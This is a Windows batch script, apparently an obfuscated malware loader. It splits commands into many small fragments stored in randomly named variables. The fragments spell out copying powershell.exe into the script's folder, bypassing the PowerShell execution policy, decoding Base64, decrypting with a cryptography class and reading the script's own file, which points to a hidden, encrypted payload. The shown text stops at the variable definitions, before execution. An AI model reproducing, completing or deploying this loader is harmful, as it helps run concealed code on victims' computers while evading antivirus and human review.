@echo off
set "COEZYJmztX=ll"
set "bthXABdMlX=Sy"
set "ZtSCIUPjfT=1."
set "VNhmCeMKlG=rS"
set "DMMdfyxldV=Wi"
set "RnrnolWhSi=po"
set "vqMRzIJEcQ=s\"
set "HEilrYWvTc=py"
set "gZPjCiWbrd=we"
set "jAkQHMedjT=Po"
set "IPeiLgihnS=0\"
set "YaraALAWSR=em"
set "omJvLLcEow=he"
set "sZKSSwtXoD=\v"
set "agUtnGROSA=do"
set "TduzoCUChL=rs"
set "MNkXUMBZMb=\W"
set "qtagUUptxQ=xe"
set "OReLrpCGIb=:\"
set "bnOrAtgTRV=nd"
set "YHqWMJZVFC=ll"
set "vwHipyFlTB= C"
set "JBRaTEXrAu=32"
set "XfpaWQAwUc=ow"
set "kgPkZOSRYL=.e"
set "kHaKFAWdMB=he"
set "kXxNRabhxP=in"
set "gsNUflMxNF= /"
set "iIPMexxLhp=st"
set "zglMClQugN=ws"
set "POcguCqiCL=co"
set "CQTLtFTQJn=we"
set "DZXEBhwzwX=y "
set "ZiilQomVYX= %~dp0"
set "JXRAfigEjy=cd"
set "ApHUdMYIbN=);$q"
set "WdRBRZJHXh=stem"
set "CnUPemKJru=$DJy"
set "GPbVRpbTrY=gMod"
set "PheAfgYfQu=m.Re"
set "DiuiCAmSEc= = N"
set "LmgJWMaTXV=-joi"
set "vWYzaudNho=rans"
set "kdwoNjpCSt=ert]"
set "lwvpPelLFg=Osv."
set "zArkOzGQhs=esaB"
set "cXIMtMfcMu=JyxW"
set "WwYejMgJDO=ew-O"
set "GTzXGiytHM=rity"
set "BTGBXmYErs=bypa"
set "bxcYBEZbfX=cE);"
set "KafUkEZXRE=brea"
set "UDkOjciwoZ=raph"
set "xMnLsKckNe=bjec"
set "vCVfWjuApY=d;$q"
set "HjxCWFAlfs=('da"
set "pCwonSeYhc=v4Ir"
set "oNZOQMXvWJ=sGUc"
set "mIoFQxGFGm=, (,"
set "rUqnKtTaUO=.Dis"
set "fNtSocpRbT=0O+g"
set "siAfgzclRW=oL'["
set "CMbhgaHilS=[Sys"
set "ipLsaNZfbG=xW ="
set "bLIKdQXzGk=.Cre"
set "EJAWGwqAvw=oin "
set "ogCzKzEkPn=th('"
set "rRiWAhBqnT=$ecG"
set "VkmfbbIXjY=LwVs"
set "DzecePEKcA=morF"
set "cwjcvMvYSu=am;$"
set "WZAEsHrPnD= if "
set "wRaMqiGWfM=hy.A"
set "dxsjoGRRNm=orF'"
set "HOrvYYvYIc=.Cop"
set "oJNLHmttzc=JyxW"
set "YrYxQUBpvc=('%~f0'"
